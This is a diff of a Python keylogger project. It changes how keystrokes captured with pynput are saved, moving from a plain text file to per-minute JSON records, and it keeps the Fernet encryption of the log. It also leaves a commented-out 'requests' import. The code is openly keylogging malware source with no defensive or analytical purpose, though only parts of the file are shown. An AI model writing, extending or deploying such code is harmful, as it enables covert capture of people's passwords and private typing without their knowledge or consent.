@@ -1,16 +1,16 @@
 import time, os
 from pynput import keyboard
 from cryptography.fernet import Fernet
+import json
 # from requests import request
-# import json
 
 # ===================== Service (State) =====================
 
 class KeyLoggerService:
     def __init__(self):
-        self.global_log = []   
-        self.log_l = {}        
-        self.long_str = ""     
+        self.global_log = []
+        self.log_l = {}
+        self.long_str = ""
 
     @staticmethod
     def get_time():
@@ -36,12 +36,17 @@ class KeyLoggerService:
 
 class FileWriter:
     def outing_to_file(self, character):
-        with open("keyfile.txt", "a", encoding="utf-8") as log_key:
-            for i in character:          
-                for j in i:             
-                    char = f"{j}\n{i[j]}\n"
-                    log_key.write(char)
-
+        with open("keyfile.json", "a", encoding="utf-8") as f:
+            for i in character:
+                for minute, items in i.items():
+                    record = {
+                        "time": minute,
+                        "keys": [
+                            (t.char if hasattr(t, "char") and t.char else str(t))
+                            for t in items
+                        ],
+                    }
+                    f.write(json.dumps(record, ensure_ascii=False) + "\n")
 
 # ===================== Manager (Flow) =====================
 
@@ -139,9 +144,9 @@ if __name__ == "__main__":
     manager.starting_listening()
 
     # Files
-    original  = "keyfile.txt"
+    original  = "keyfile.json"
     encrypted = "keyfile.encrypted"
-    decrypted = "keyfile_decrypted.txt"
+    decrypted = "keyfile_decrypted.json"
 
     # Encrypt & Decrypt
     enc = Encryptor("key.key")
